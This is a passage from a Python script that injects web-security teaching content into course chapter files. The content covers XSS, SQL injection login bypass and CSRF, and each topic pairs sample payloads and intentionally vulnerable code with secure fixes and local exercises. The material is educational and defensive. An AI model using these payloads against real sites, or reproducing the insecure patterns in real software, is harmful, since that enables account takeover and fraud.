                    "codeOrConfig": "// INSECURE: Directly rendering untrusted string into DOM\nconst commentContainer = document.getElementById('comments');\nfetch('/api/comments/123')\n  .then(res => res.json())\n  .then(data => {\n    // Vulnerable sink: executes any embedded <script> or <img onerror=...>\n    commentContainer.innerHTML = '<div class=\"comment\">' + data.text + '</div>';\n  });",
                    "explanation": "innerHTML invokes the full HTML parser. If data.text contains <img src=x onerror=alert(document.cookie)>, the script executes immediately in the user's session."
                },
                "secure": {
                    "label": "Secure: textContent & DOMPurify Sanitization",
                    "codeOrConfig": "// SECURE: Safe DOM text node assignment or DOMPurify sanitization\nimport DOMPurify from 'dompurify';\n\nconst commentContainer = document.getElementById('comments');\nfetch('/api/comments/123')\n  .then(res => res.json())\n  .then(data => {\n    // Option A (Plain text): Browser treats string strictly as text data\n    const p = document.createElement('p');\n    p.textContent = data.text;\n    commentContainer.appendChild(p);\n\n    // Option B (Rich text): DOMPurify strips dangerous tags and handlers\n    // commentContainer.innerHTML = DOMPurify.sanitize(data.text);\n  });",
                    "explanation": "textContent bypasses the HTML parser entirely and treats all characters as inert string literals. DOMPurify removes malicious event handlers and scripts if rich HTML is required."
                },
                "keyTakeaway": "Never use innerHTML to insert user-controlled data. Default to textContent, and always mark authentication cookies HttpOnly."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-5-1",
                "title": "Simulating Harmless DOM-Based Script Reflection & CSP Validation",
                "learningObjective": "Observe how unescaped HTML characters manipulate DOM sinks and verify how Content-Security-Policy (CSP) headers block script execution.",
                "requiredTools": ["python3", "curl", "modern browser"],
                "environmentSetup": "Local terminal with Python 3.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Inspect how HTML entity encoding neutralizes malicious script characters.",
                        "command": "python3 -c \"import html; raw = '<script>alert(1)</script>'; print('Raw:', raw); print('Escaped:', html.escape(raw))\"",
                        "commandExplanation": "Demonstrates how <, >, and quotes are converted into safe HTML entities (&lt;, &gt;) that browsers render harmlessly as text.",
                        "expectedOutput": "Raw: <script>alert(1)</script>\nEscaped: &lt;script&gt;alert(1)&lt;/script&gt;"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Audit response headers of a web endpoint to verify anti-XSS Content Security Policy (CSP) presence.",
                        "command": "curl -I -s https://www.google.com | grep -iE \"(content-security-policy|x-xss-protection|x-frame-options)\"",
                        "commandExplanation": "Extracts modern security headers that instruct browser security sandboxes to restrict script evaluation.",
                        "expectedOutput": "content-security-policy: ... script-src 'nonce-...'\nx-frame-options: SAMEORIGIN"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Examine Cookie attributes to verify HttpOnly protection.",
                        "command": "curl -I -s https://github.com | grep -i \"set-cookie\" | head -n 1",
                        "commandExplanation": "Checks that session cookies include HttpOnly, Secure, and SameSite flags.",
                        "expectedOutput": "set-cookie: _gh_sess=...; Path=/; Secure; HttpOnly; SameSite=Lax"
                    }
                ],
                "whatHappened": "Escaping converted active script tags into passive printable text. Modern web applications deploy strict CSP headers and HttpOnly cookie attributes to prevent script injection and cookie theft.",
                "securityLessons": [
                    "Contextual output encoding is the #1 defense against Cross-Site Scripting.",
                    "CSP is a defense-in-depth safety net that blocks unauthorized scripts even if injection occurs.",
                    "HttpOnly cookies ensure that even if an attacker achieves XSS execution, they cannot steal session tokens."
                ],
                "prevention": [
                    "Deploy Content-Security-Policy: default-src 'self'; script-src 'self'.",
                    "Mark all sensitive session cookies HttpOnly; Secure; SameSite=Lax.",
                    "Use React, Angular, or DOMPurify for user input rendering."
                ]
            }
        ]
    },

    6: {
        "attackVisualizations": [
            {
                "id": "attack-6-1",
                "title": "Classic Authentication Bypass via Tautology SQL Injection",
                "attackName": "SQLi Tautology & In-Band Authentication Bypass",
                "overview": "An attacker enters SQL syntax into a login form to alter the query logic, creating a condition that is always true (tautology) and logging in as administrator without a password.",
                "targetVulnerability": "Backend concatenates raw user input directly into SQL command strings instead of using parameterized prepared statements.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Input Submission with SQL Delimiter",
                        "actor": "Attacker",
                        "action": "Enters quote delimiter and boolean tautology into login form",
                        "technicalDetail": "In the username field, the attacker types: admin' OR '1'='1 and enters any arbitrary password in the password field.",
                        "color": "red",
                        "payload": "POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&password=anything"
                    },
                    {
                        "step": 2,
                        "title": "Unsafe Query String Concatenation",
                        "actor": "Backend Web Application",
                        "action": "Builds SQL statement string via direct variable interpolation",
                        "technicalDetail": "The server constructs the query: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'.",
                        "color": "orange"
                    },
                    {
                        "step": 3,
                        "title": "Parser Logic Restructuring",
                        "actor": "Database SQL Parser",
                        "action": "Evaluates boolean expression altered by injected syntax",
                        "technicalDetail": "Due to operator precedence, the database evaluates: (username = 'admin') OR ('1'='1' AND password = '...'). Since '1'='1' is TRUE, the entire WHERE clause evaluates to TRUE.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Administrative Record Return",
                        "actor": "Database Engine",
                        "action": "Returns the first matching user row (the admin record)",
                        "technicalDetail": "The database returns row #1: the administrator account record, completely ignoring the invalid password.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Full Administrative Session Grant",
                        "actor": "Application Backend",
                        "action": "Signs admin session cookie and redirects to dashboard",
                        "technicalDetail": "The application observes a returned user record, assumes authentication succeeded, and grants full administrator privileges.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Prepared Statements Defense",
                        "actor": "Database Driver with Prepared Statement",
                        "action": "Compiles query template beforehand; treats input strictly as literal data",
                        "technicalDetail": "With parameterized queries, the input admin' OR '1'='1 is matched literally against the username column. No user exists with that literal name; authentication fails safely.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Robust SQL Injection Defenses",
                    "rules": [
                        "Always use Parameterized Queries (Prepared Statements) for all SQL database interactions.",
                        "Utilize reputable Object-Relational Mappers (ORMs) like Prisma, Hibernate, or Entity Framework.",
                        "Apply the Principle of Least Privilege: ensure application database accounts have minimal permissions (no DROP or administrative rights).",
                        "Deploy a Web Application Firewall (WAF) to detect and block common SQL injection signatures."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Database Queries: String Interpolation vs. Parameterized Prepared Statements",
                "vulnerable": {
                    "label": "Vulnerable: String Concatenation Query Construction",
                    "codeOrConfig": "# INSECURE: Direct string formatting enables SQL Injection\ndef authenticate_user(username, password):\n    query = f\"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'\"\n    # If username is: admin' OR '1'='1 --\n    # The entire query logic is subverted!\n    cursor.execute(query)\n    return cursor.fetchone()",
                    "explanation": "User input breaks out of the data context and becomes executable SQL command syntax, allowing attackers to bypass authentication or extract entire tables via UNION SELECT."
                },
                "secure": {
                    "label": "Secure: Parameterized Prepared Statements",
                    "codeOrConfig": "# SECURE: Prepared statement treats input strictly as literal values\ndef authenticate_user(username, password):\n    query = \"SELECT id, password_hash, role FROM users WHERE username = %s\"\n    cursor.execute(query, (username,)) # Parameter passed separately!\n    user = cursor.fetchone()\n    if user and bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):\n        return user\n    return None",
                    "explanation": "The database compiles the SQL statement structure prior to binding parameter values. Characters like quotes and semicolons are treated strictly as literal data, making SQL injection impossible."
                },
                "keyTakeaway": "Prepared statements separate code from data. Input can never change query structure when parameters are bound."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-6-1",
                "title": "Refactoring Vulnerable SQLite Database Queries into Secure Prepared Statements",
                "learningObjective": "Demonstrate how string concatenation permits SQL injection and refactor the code into secure prepared statements using SQLite in Python.",
                "requiredTools": ["python3", "sqlite3"],
                "environmentSetup": "Local terminal with Python 3.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Create an in-memory SQLite database populated with sample user accounts.",
                        "command": "python3 -c \"import sqlite3; con = sqlite3.connect(':memory:'); cur = con.cursor(); cur.execute('CREATE TABLE users (id INT, name TEXT, pass TEXT)'); cur.execute(\\\"INSERT INTO users VALUES (1, 'admin', 'SuperSecret99')\\\"); con.commit(); print('Database initialized with admin row')\"",
                        "commandExplanation": "Initializes a temporary in-memory database with an admin user row.",
                        "expectedOutput": "Database initialized with admin row"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Demonstrate authentication bypass using string concatenation with tautology payload.",
                        "command": "python3 -c \"import sqlite3; con = sqlite3.connect(':memory:'); cur = con.cursor(); cur.execute('CREATE TABLE users (id INT, name TEXT, pass TEXT)'); cur.execute(\\\"INSERT INTO users VALUES (1, 'admin', 'SuperSecret99')\\\"); user_input = \\\"admin' OR '1'='1\\\"; query = f\\\"SELECT * FROM users WHERE name = '{user_input}'\\\"; print('Executed query:', query); print('Result:', cur.execute(query).fetchall())\"",
                        "commandExplanation": "Concatenates the unescaped input into the query string, resulting in an unauthorized dump of the admin record.",
                        "expectedOutput": "Executed query: SELECT * FROM users WHERE name = 'admin' OR '1'='1'\nResult: [(1, 'admin', 'SuperSecret99')]"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Test the same payload against a parameterized prepared statement.",
                        "command": "python3 -c \"import sqlite3; con = sqlite3.connect(':memory:'); cur = con.cursor(); cur.execute('CREATE TABLE users (id INT, name TEXT, pass TEXT)'); cur.execute(\\\"INSERT INTO users VALUES (1, 'admin', 'SuperSecret99')\\\"); user_input = \\\"admin' OR '1'='1\\\"; query = 'SELECT * FROM users WHERE name = ?'; print('Result with parameter binding:', cur.execute(query, (user_input,)).fetchall())\"",
                        "commandExplanation": "Binds the payload safely as a single literal string parameter. No user exists with that literal name, so empty list is returned.",
                        "expectedOutput": "Result with parameter binding: []"
                    }
                ],
                "whatHappened": "The concatenated query executed the attacker's OR '1'='1 logic and leaked the administrator record. In the parameterized query, SQLite treated the entire payload as literal text, safely returning an empty result set.",
                "securityLessons": [
                    "String formatting (f-strings, %s, concatenation) in SQL queries is the root cause of SQL injection.",
                    "Parameterized queries completely separate SQL instruction compilation from user data values.",
                    "Input validation (e.g. alphanumeric checks) is helpful for business logic, but parameterized queries are the mandatory defense."
                ],
                "prevention": [
                    "Always use parameterized queries (?) or named placeholders (:name).",
                    "Use ORMs like SQLAlchemy, Hibernate, or Prisma.",
                    "Restrict database user privileges so web applications cannot execute DROP or schema alterations."
                ]
            }
        ]
    },

    7: {
        "attackVisualizations": [
            {
                "id": "attack-7-1",
                "title": "Cross-Site Forged Wire Transfer Attack Workflow",
                "attackName": "Classic Cross-Site Request Forgery (CSRF)",
                "overview": "A victim visits a malicious webpage while logged into a trusted banking portal. The malicious page silently triggers an unauthorized fund transfer by exploiting automatic browser cookie transmission.",
                "targetVulnerability": "Banking API relies exclusively on ambient credentials (cookies) without validating anti-CSRF synchronizer tokens or SameSite cookie flags.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Victim Active Session Established",
                        "actor": "Victim",
                        "action": "Logs into online banking portal and keeps browser session active",
                        "technicalDetail": "Victim logs into bank.com. The browser stores a valid session cookie: Set-Cookie: session_id=xyz789; Path=/; Domain=bank.com.",
                        "color": "blue"
                    },
                    {
                        "step": 2,
                        "title": "Phishing or Malicious Lure",
                        "actor": "Attacker",
                        "action": "Lures victim to attacker-controlled site (evil-deals.com)",
                        "technicalDetail": "Victim clicks a phishing link or banner ad while browsing in another browser tab, opening https://evil-deals.com.",
                        "color": "orange"
                    },
                    {
                        "step": 3,
                        "title": "Hidden Form Dispatch",
                        "actor": "Malicious Webpage",
                        "action": "Silently auto-submits a POST request to bank.com/transfer",
                        "technicalDetail": "The malicious webpage executes JavaScript to submit an invisible HTML form targeting the bank's wire transfer endpoint.",
                        "color": "red",
                        "payload": "<form id='f' action='https://bank.com/api/transfer' method='POST'>\n  <input name='recipient' value='attacker_wallet' />\n  <input name='amount' value='5000' />\n</form>\n<script>document.getElementById('f').submit();</script>"
                    },
                    {
                        "step": 4,
                        "title": "Ambient Credential Transmission",
                        "actor": "Victim Browser",
                        "action": "Automatically attaches victim's bank.com cookies to request",
                        "technicalDetail": "Because the request is directed to bank.com, legacy browser behavior automatically attaches the victim's session cookie, even though the request originated on evil-deals.com.",
                        "color": "orange"
                    },
                    {
                        "step": 5,
                        "title": "Unauthorized Transaction Execution",
                        "actor": "Bank Server",
                        "action": "Validates session cookie and executes the $5,000 transfer",
                        "technicalDetail": "The bank verifies the session cookie is valid. Lacking an anti-CSRF token check, it processes the transfer to the attacker's account.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Anti-CSRF Tokens & SameSite=Strict",
                        "actor": "Defensive Architecture",
                        "action": "Blocks cross-origin cookie delivery and requires unique form token",
                        "technicalDetail": "SameSite=Strict prevents the browser from sending cookies on cross-origin requests. Synchronizer tokens in the form body cannot be read by cross-origin pages due to Same-Origin Policy (SOP).",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Anti-CSRF Defenses",
                    "rules": [
                        "Configure all session cookies with SameSite=Strict or SameSite=Lax.",
                        "Implement the Synchronizer Token Pattern (anti-CSRF tokens tied to the session and verified in POST body/headers).",
                        "Use modern custom request headers (e.g. X-Requested-With or Authorization: Bearer <JWT>) which browsers do not attach automatically to cross-site form submissions.",
                        "Require user re-authentication or password confirmation before executing critical transactions."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "State-Changing Endpoint: Cookie-Only Verification vs. Anti-CSRF Token Validation",
                "vulnerable": {
                    "label": "Vulnerable: Relies Exclusively on Session Cookie",
                    "codeOrConfig": "// INSECURE: Accepts POST requests using only ambient session cookies\napp.post('/api/transfer', (req, res) => {\n  const user = getSessionUser(req.cookies.session_id);\n  if (!user) return res.status(401).send('Unauthorized');\n  \n  // Any third-party website can forge this request!\n  executeTransfer(user.id, req.body.recipient, req.body.amount);\n  res.send('Transfer successful');\n});",
                    "explanation": "Because browsers automatically send cookies with cross-site requests, third-party sites can trigger transfers without user knowledge."
                },
                "secure": {
                    "label": "Secure: Synchronizer CSRF Token & SameSite Cookie",
                    "codeOrConfig": "// SECURE: Validates cryptographically random CSRF token from request header/body\nimport csurf from 'csurf';\nconst csrfProtection = csurf({ cookie: true });\n\n// Session cookie configured with SameSite protection:\nres.cookie('session_id', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict'\n});\n\napp.post('/api/transfer', csrfProtection, (req, res) => {\n  // csurf automatically validates that req.body._csrf matches expected token\n  const user = getSessionUser(req.cookies.session_id);\n  executeTransfer(user.id, req.body.recipient, req.body.amount);\n  res.send('Transfer successful');\n});",
                    "explanation": "SameSite=Strict prevents cross-site cookie transmission. The anti-CSRF token cannot be read or forged by third-party scripts due to the Same-Origin Policy."
                },
                "keyTakeaway": "Never rely solely on automatic browser cookies for state-changing operations. Require explicit anti-CSRF tokens or custom headers."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-7-1",
                "title": "Auditing Cookie SameSite Flags & CSRF Protection Headers",
                "learningObjective": "Inspect HTTP response headers using curl to verify whether session cookies include modern SameSite flags that prevent CSRF attacks.",
                "requiredTools": ["curl", "grep", "python3"],
                "environmentSetup": "Local terminal with curl and Python.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Inspect session cookie flags on a major production website to analyze SameSite and HttpOnly settings.",
                        "command": "curl -I -s https://en.wikipedia.org | grep -i \"set-cookie\"",
                        "commandExplanation": "Retrieves the Set-Cookie headers and checks for SameSite=Lax, SameSite=Strict, and Secure attributes.",
                        "expectedOutput": "Set-Cookie: ...; secure; HttpOnly; SameSite=Lax"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Generate a cryptographically secure 256-bit anti-CSRF token using Python secrets module.",
                        "command": "python3 -c \"import secrets; token = secrets.token_hex(32); print('Generated Anti-CSRF Token:', token); print('Entropy bits:', len(token)*4)\"",
                        "commandExplanation": "Generates a cryptographically strong random token that cannot be guessed or brute-forced by an attacker.",
                        "expectedOutput": "Generated Anti-CSRF Token: 4f8a2b9c7d1e3f... (64 hex characters)\nEntropy bits: 256"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Test how browsers evaluate cross-origin POST requests with custom security headers.",
                        "command": "curl -X POST https://httpbin.org/post -H \"X-CSRF-Token: test-token-123\" -H \"Content-Type: application/json\" -d '{\"transfer\": 100}'",
                        "commandExplanation": "Simulates sending a request with a custom X-CSRF-Token header, which triggers a browser CORS preflight check if dispatched from a foreign origin.",
                        "expectedOutput": "{\n  \"headers\": {\n    \"X-Csrf-Token\": \"test-token-123\",\n    ...\n  }\n}"
                    }
                ],
                "whatHappened": "The audit demonstrated how modern servers instruct browsers to block automatic cookie transmission on cross-site requests using SameSite=Lax/Strict and protect form endpoints with unguessable 256-bit synchronizer tokens.",
                "securityLessons": [
                    "SameSite=Strict provides the highest protection, preventing cookie transmission on all cross-site navigations.",
                    "SameSite=Lax is the modern browser default, allowing cookies on top-level safe GET navigations but blocking cross-site POSTs.",
                    "Custom headers (e.g. X-CSRF-Token) trigger browser CORS preflights, neutralizing HTML-based form submission attacks."
                ],
                "prevention": [
                    "Enforce SameSite=Lax or SameSite=Strict on all authentication cookies.",
                    "Deploy anti-CSRF tokens for all state-changing POST, PUT, DELETE requests.",
                    "Verify Origin and Referer request headers on incoming state-changing endpoints."
                ]
            }
        ]
    }
}

def update_chapter(ch_num):
    filepath = f"src/data/notes/chapters/chapter{ch_num:02d}.ts"
    if not os.path.exists(filepath):
        print(f"File not found: {filepath}")
        return

    enrichment = CHAPTER_ENRICHMENTS.get(ch_num)
    if not enrichment:
        print(f"No enrichment data for chapter {ch_num}")
        return

    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    # Check if already enriched
    if '"attackVisualizations":' in content or 'attackVisualizations' in content:
        print(f"Chapter {ch_num} already enriched, skipping.")
        return

    # Find the closing brace of the export
    last_brace_idx = content.rfind("};")
    if last_brace_idx == -1:
        print(f"Could not find closing brace in {filepath}")
        return

    # Prepare lines to insert
    insertions = []
    if "technicalVisual" in enrichment:
        insertions.append(f'  "technicalVisual": {json.dumps(enrichment["technicalVisual"], indent=4)},\n')
    if "attackVisualizations" in enrichment:
        insertions.append(f'  "attackVisualizations": {json.dumps(enrichment["attackVisualizations"], indent=4)},\n')
    if "beforeAfterComparisons" in enrichment:
        insertions.append(f'  "beforeAfterComparisons": {json.dumps(enrichment["beforeAfterComparisons"], indent=4)},\n')
    if "handsOnPracticals" in enrichment:
        insertions.append(f'  "handsOnPracticals": {json.dumps(enrichment["handsOnPracticals"], indent=4)},\n')

    # Indent JSON properly
    indented_insertions = []
    for item in insertions:
        # replace indentation
        lines = item.split("\n")
        fixed_lines = [lines[0]] + ["  " + l if l.strip() else l for l in lines[1:]]
        indented_insertions.append("\n".join(fixed_lines))

    insertion_text = ",\n" + "".join(indented_insertions).rstrip(",\n") + "\n"

    # Insert right before the last };
    # But wait, we need to ensure the preceding item has a comma or we add comma
    # Let's inspect what is right before last_brace_idx
    preceding = content[:last_brace_idx].rstrip()
    if not preceding.endswith(","):
        preceding += ","

    new_content = preceding + "\n" + "".join(indented_insertions).rstrip(",\n") + "\n};\n"

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)
    print(f"Successfully enriched Chapter {ch_num:02d}!")

if __name__ == "__main__":
    for i in range(1, 8):
        update_chapter(i)

